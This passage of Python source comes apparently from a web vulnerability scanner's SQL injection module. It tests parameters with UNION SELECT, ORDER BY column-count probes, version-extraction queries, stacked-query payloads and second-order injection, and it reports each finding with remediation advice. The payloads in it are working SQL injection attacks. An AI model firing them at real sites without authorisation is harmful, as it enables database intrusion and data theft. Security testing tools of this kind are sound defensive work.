                ),
                description=(
                    f"Boolean-based blind SQL injection. {desc}. "
                    f"True/false conditions produce measurably different responses. "
                    f"True condition matches baseline structure; false condition diverges."
                ),
                remediation=DEFAULT_SQLI_REMEDIATION,
                cvss=9.8,
                cwe="CWE-89",
                tool=self.NAME,
                verified=verified,
                confidence=confidence,
                request=f"TRUE: GET {true_url}\nFALSE: GET {false_url}",
            ))

        return findings

    # ------------------------------------------------------------------
    # UNION-based detection
    # ------------------------------------------------------------------

    def _test_union_based(
        self, client: "httpx.Client", url: str, param: str,
        base_params: dict, baseline: BaselineMetrics, host: str, waf: WAFResult
    ) -> List[Finding]:
        """Test for UNION-based SQLi.

        Steps:
        1. Find column count via ORDER BY (binary search)
        2. Test UNION SELECT with correct column count
        3. Identify columns with useful data types
        """
        findings: List[Finding] = []

        # Step 1: Find column count using ORDER BY
        num_columns = self._find_column_count(client, url, param, base_params, baseline, host)
        if num_columns is None:
            return findings

        # Step 2: Build UNION SELECT payload
        null_columns = ",".join(["NULL"] * num_columns)

        # Test various UNION payloads
        union_payloads = [
            f"' UNION SELECT {null_columns}--",
            f"' UNION ALL SELECT {null_columns}--",
            f" UNION SELECT {null_columns}--",
            f"-1 UNION SELECT {null_columns}--",
            f"0 UNION SELECT {null_columns}--",
        ]

        # If we found columns, also try to extract useful data
        if num_columns >= 1:
            # Try version extraction in each column position
            for col_idx in range(num_columns):
                cols = ["NULL"] * num_columns
                # DBMS-specific version queries
                version_payloads = [
                    ("@@version", "MySQL/MSSQL"),
                    ("version()", "PostgreSQL"),
                    ("sqlite_version()", "SQLite"),
                    ("(SELECT banner FROM v$version WHERE ROWNUM=1)", "Oracle"),
                ]
                for version_expr, dbms_hint in version_payloads:
                    cols[col_idx] = version_expr
                    col_str = ",".join(cols)
                    payload = f"' UNION SELECT {col_str}--"
                    test_params = dict(base_params)
                    test_params[param] = payload
                    test_url = self._build_url(url, test_params)

                    self.limiter.wait(host)
                    try:
                        resp = client.get(test_url)
                        body = resp.text

                        # Check if we got a version string back
                        version_indicators = [
                            r"\d+\.\d+\.\d+",
                            r"MariaDB",
                            r"PostgreSQL",
                            r"SQLite",
                            r"Microsoft SQL Server",
                            r"Oracle Database",
                        ]
                        for vi in version_indicators:
                            match = re.search(vi, body)
                            if match and len(body) != baseline.response_length:
                                findings.append(Finding(
                                    vuln_type="SQL Injection",
                                    title=f"UNION-based SQLi in parameter '{param}' — {dbms_hint}",
                                    severity="CRITICAL",
                                    url=url,
                                    parameter=param,
                                    method="GET",
                                    payload=payload,
                                    evidence=(
                                        f"Column count: {num_columns} | "
                                        f"Data column index: {col_idx} | "
                                        f"Version extracted: {match.group(0)}"
                                    ),
                                    description=(
                                        f"UNION-based SQL injection confirmed. {num_columns} columns found "
                                        f"via ORDER BY. Column {col_idx} contains {dbms_hint} data."
                                    ),
                                    remediation=DBMS_REMEDIATION.get(dbms_hint.split("/")[0], DEFAULT_SQLI_REMEDIATION),
                                    cvss=9.8,
                                    cwe="CWE-89",
                                    tool=self.NAME,
                                    verified=True,
                                    confidence="HIGH",
                                    request=f"GET {test_url} HTTP/1.1",
                                    response_snippet=body[:2000],
                                ))
                                return findings
                    except Exception:
                        continue

                cols[col_idx] = "NULL"  # Reset

        # Step 3: Generic UNION test (just check for different response)
        for payload in union_payloads:
            test_params = dict(base_params)
            test_params[param] = payload
            test_url = self._build_url(url, test_params)

            self.limiter.wait(host)
            try:
                resp = client.get(test_url)
                body = resp.text

                # If response differs from baseline but doesn't have SQL error
                if (
                    len(body) != baseline.response_length
                    and resp.status_code == 200
                    and not self._has_sql_error(body)
                ):
                    findings.append(Finding(
                        vuln_type="SQL Injection",
                        title=f"UNION-based SQLi (unconfirmed) in parameter '{param}'",
                        severity="HIGH",
                        url=url,
                        parameter=param,
                        method="GET",
                        payload=payload,
                        evidence=(
                            f"Column count: {num_columns} | "
                            f"Response changed from {baseline.response_length} to {len(body)} bytes | "
                            f"Status: {resp.status_code}"
                        ),
                        description=(
                            f"UNION SELECT with {num_columns} columns changed response. "
                            f"Likely injectable but data extraction not confirmed."
                        ),
                        remediation=DEFAULT_SQLI_REMEDIATION,
                        cvss=9.8,
                        cwe="CWE-89",
                        tool=self.NAME,
                        verified=False,
                        confidence="MEDIUM",
                        request=f"GET {test_url} HTTP/1.1",
                    ))
                    return findings
            except Exception:
                continue

        return findings

    def _find_column_count(
        self, client: "httpx.Client", url: str, param: str,
        base_params: dict, baseline: BaselineMetrics, host: str
    ) -> Optional[int]:
        """Find the number of columns using ORDER BY binary search."""
        # Control request — verify baseline is stable before each probe
        def _control_ok() -> bool:
            """Send a benign request to check for transient server errors."""
            try:
                ctrl_params = dict(base_params)
                ctrl_params[param] = "1"
                ctrl_url = self._build_url(url, ctrl_params)
                self.limiter.wait(host)
                ctrl = client.get(ctrl_url)
                return ctrl.status_code < 500 and not self._has_sql_error(ctrl.text)
            except Exception:
                return False

        # Try ORDER BY 1..20
        for n in range(1, 21):
            if not _control_ok():
                continue
            payload = f"' ORDER BY {n}--"
            test_params = dict(base_params)
            test_params[param] = payload
            test_url = self._build_url(url, test_params)

            errors = 0
            for _ in range(2):
                self.limiter.wait(host)
                try:
                    resp = client.get(test_url)
                    body = resp.text
                    if resp.status_code >= 500 or self._has_sql_error(body):
                        errors += 1
                except Exception:
                    errors += 1

            # Only conclude column count after 2 consistent errors
            if errors >= 2:
                return max(1, n - 1)

            # Significant length change often means ORDER BY failed
            self.limiter.wait(host)
            try:
                resp = client.get(test_url)
                body = resp.text
                if abs(len(body) - baseline.response_length) > baseline.response_length * 0.3:
                    return max(1, n - 1)
            except Exception:
                continue

        # Also try negative-based: UNION SELECT with increasing NULLs
        for n in range(1, 16):
            nulls = ",".join(["NULL"] * n)
            payload = f"' UNION SELECT {nulls}--"
            test_params = dict(base_params)
            test_params[param] = payload
            test_url = self._build_url(url, test_params)

            self.limiter.wait(host)
            try:
                resp = client.get(test_url)
                body = resp.text

                # Success: response differs from baseline, no SQL error
                if (
                    resp.status_code == 200
                    and not self._has_sql_error(body)
                    and abs(len(body) - baseline.response_length) < baseline.response_length * 0.3
                ):
                    return n
                # If we hit "different number of columns" error, keep trying
                if self._has_sql_error(body):
                    continue
            except Exception:
                continue

        return None

    # ------------------------------------------------------------------
    # Stacked queries detection
    # ------------------------------------------------------------------

    def _test_stacked_queries(
        self, client: "httpx.Client", url: str, param: str,
        base_params: dict, host: str, waf: WAFResult
    ) -> List[Finding]:
        """Test if stacked queries (semicolons) are supported."""
        findings: List[Finding] = []

        for payload, dbms_hint in STACKED_PAYLOADS:
            if "DROP TABLE" in payload:
                continue  # Skip destructive payloads

            test_params = dict(base_params)
            test_params[param] = payload
            test_url = self._build_url(url, test_params)

            self.limiter.wait(host)
            try:
                resp = client.get(test_url)
                body = resp.text

                # Check for SQL errors indicating semicolons are processed
                for dbms, pattern in _ALL_ERROR_PATTERNS:
                    if re.search(pattern, body, re.I):
                        match = re.search(pattern, body, re.I)
                        if match and self._validate_sql_error(body, pattern, match.group(0)):
                            findings.append(Finding(
                                vuln_type="SQL Injection (Stacked queries)",
                                title=f"Stacked query SQLi ({dbms}) in parameter '{param}'",
                                severity="CRITICAL",
                                url=url,
                                parameter=param,
                                method="GET",
                                payload=payload,
                                evidence=self._extract_evidence(body, match),
                                description=(
                                    f"Stacked queries supported ({dbms}). "
                                    f"Semicolons are processed, allowing multi-statement injection."
                                ),
                                remediation=DBMS_REMEDIATION.get(dbms, DEFAULT_SQLI_REMEDIATION),
                                cvss=9.8,
                                cwe="CWE-89",
                                tool=self.NAME,
                                verified=True,
                                confidence="HIGH",
                                request=f"GET {test_url} HTTP/1.1",
                                response_snippet=body[:2000],
                            ))
                            return findings
            except Exception:
                continue

        return findings

    # ------------------------------------------------------------------
    # Second-order injection
    # ------------------------------------------------------------------

    def _test_second_order(
        self, client: "httpx.Client", url: str, base_params: dict,
        baselines: Dict[str, BaselineMetrics], host: str, waf: WAFResult
    ) -> List[Finding]:
        """Test for second-order SQL injection.

        Strategy: Inject a payload via a form/parameter, then visit a
        different page (like a profile page) to see if the stored
        payload triggers a SQL error.
        """
        findings: List[Finding] = []

        # Only test if we found forms or POST endpoints
        # Use a unique marker to track our payload
        marker = f"SO{int(time.time())}"
        test_payloads = [
            f"'{marker}",
            f"' AND 1=CONVERT(int, '{marker}')--{marker}",
        ]

        parsed = urlparse(url)

        second_order_pages = ["/profile", "/settings", "/dashboard", "/account", "/admin"]

        parsed_base = urlparse(url)
        base_origin = f"{parsed_base.scheme}://{parsed_base.netloc}"

        for payload in test_payloads:
            # Try POST with the payload
            for param_name in base_params:
                test_params = dict(base_params)
                test_params[param_name] = payload

                self.limiter.wait(host)
                try:
                    resp = client.post(url, data=test_params)
                except Exception:
                    continue

            # Crawl common pages that might render user data
            for page in second_order_pages:
                check_url = base_origin + page
                self.limiter.wait(host)
                try:
                    check_resp = client.get(check_url)
                    body = check_resp.text
                except Exception:
                    continue

                # Check if our marker appeared in an error context
                if marker in body:
                    for dbms, pattern in _ALL_ERROR_PATTERNS:
                        if re.search(pattern, body, re.I):
                            match = re.search(pattern, body, re.I)
                            if match:
                                findings.append(Finding(
                                    vuln_type="SQL Injection (Second-order)",
                                    title=f"Second-order SQLi detected ({dbms})",
                                    severity="CRITICAL",
                                    url=check_url,
                                    parameter=", ".join(base_params.keys()),
                                    method="POST",
                                    payload=payload,
                                    evidence=(
                                        f"Payload stored and triggered on subsequent GET at {check_url}. "
                                        f"Marker '{marker}' found in response with SQL error. "
                                        f"Error pattern: {pattern}"
                                    ),
                                    description=(
                                        f"Second-order SQL injection ({dbms}). "
                                        f"Input was stored and later executed in a SQL context "
                                        f"when page {check_url} was loaded."
                                    ),
                                    remediation=DBMS_REMEDIATION.get(dbms, DEFAULT_SQLI_REMEDIATION),
                                    cvss=9.8,
                                    cwe="CWE-89",
                                    tool=self.NAME,
                                    verified=True,
                                    confidence="HIGH",
                                    request=f"POST {url} with payload\nGET {check_url} (check)",
                                    response_snippet=body[:2000],
                                ))
                                return findings

        return findings

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    def _validate_sql_error(self, body: str, pattern: str, matched_text: str) -> bool:
        """Validate that a SQL error is genuine, not a false positive.

        Checks:
        - Error is not in documentation/tutorial context
        - Error text looks like a real runtime error
        - Not inside a code block or pre tag (likely documentation)
        """
        body_lower = body.lower()

        # Check if matched text is inside a <pre>, <code>, or documentation block
        idx = body_lower.find(matched_text.lower())
        if idx > 0:
            preceding = body_lower[max(0, idx - 500):idx]
            # If inside code/docs section, likely false positive
            if any(marker in preceding for marker in [
                "<pre>", "<code>", "example", "tutorial", "documentation",
                "learn", "blog post", "article", "how to", "sample code",
                "```", "snippet",
            ]):
                return False

        # The matched text itself should look like a real error
        # (not just a keyword mention)
        error_indicators = [
            "error", "exception", "warning", "syntax", "failed",
            "invalid", "denied", "violation", "not found",
        ]
        matched_lower = matched_text.lower()
        # If it's a short pattern match (like just "MySQL"), require more context
        if len(matched_text) < 20:
            surrounding = body_lower[max(0, idx - 100):idx + 100] if idx >= 0 else ""
            return any(ind in surrounding for ind in error_indicators)

        return True

    def _extract_evidence(self, body: str, match: re.Match) -> str:
        """Extract evidence text around a regex match."""
        start = max(0, match.start() - 80)
        end = min(len(body), match.end() + 80)
        snippet = body[start:end].strip()
        # Truncate for readability
        if len(snippet) > 500:
            snippet = snippet[:500]
        return snippet

    def _has_sql_error(self, body: str) -> bool:
        """Quick check if response contains any SQL error pattern."""
        for _, pattern in _ALL_ERROR_PATTERNS:
            if re.search(pattern, body, re.I):
                return True
        return False

    def _strip_dynamic(self, text: str) -> str:
        """Remove dynamic content (timestamps, tokens, random values) for comparison."""
        # Remove common dynamic patterns
        text = re.sub(r'\b[a-f0-9]{32,}\b', 'HASH', text)  # MD5/SHA hashes
        text = re.sub(r'\b\d{10,13}\b', 'TIMESTAMP', text)  # Unix timestamps
        text = re.sub(r'csrf[_-]?token["\s:=]+["\']?[a-zA-Z0-9_-]+', 'CSRF_TOKEN', text, flags=re.I)
        text = re.sub(r'nonce["\s:=]+["\']?[a-zA-Z0-9_-]+', 'NONCE', text, flags=re.I)
        text = re.sub(r'\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}', 'DATETIME', text)
        return text

    def _similarity_ratio(self, text_a: str, text_b: str) -> float:
        """Compute similarity ratio between two texts (0.0 to 1.0).

        Uses a simple line-based overlap method for efficiency.
        """
        if not text_a or not text_b:
            return 0.0
        if text_a == text_b:
            return 1.0

        # Line-based comparison
        lines_a = set(text_a.splitlines())
        lines_b = set(text_b.splitlines())

        if not lines_a or not lines_b:
            # Fall back to character n-gram
            return self._char_ngram_similarity(text_a, text_b, n=4)

        intersection = lines_a & lines_b
        union = lines_a | lines_b
        return len(intersection) / len(union) if union else 0.0

    def _char_ngram_similarity(self, a: str, b: str, n: int = 4) -> float:
        """Character n-gram Jaccard similarity."""
        if len(a) < n or len(b) < n:
            return 1.0 if a == b else 0.0
        grams_a = set(a[i:i + n] for i in range(len(a) - n + 1))
        grams_b = set(b[i:i + n] for i in range(len(b) - n + 1))
        intersection = grams_a & grams_b
        union = grams_a | grams_b
        return len(intersection) / len(union) if union else 0.0

    def _build_url(self, base_url: str, params: dict) -> str:
        """Build URL with query parameters."""
        parsed = urlparse(base_url)
        return urlunparse(parsed._replace(query=urlencode(params, doseq=True)))
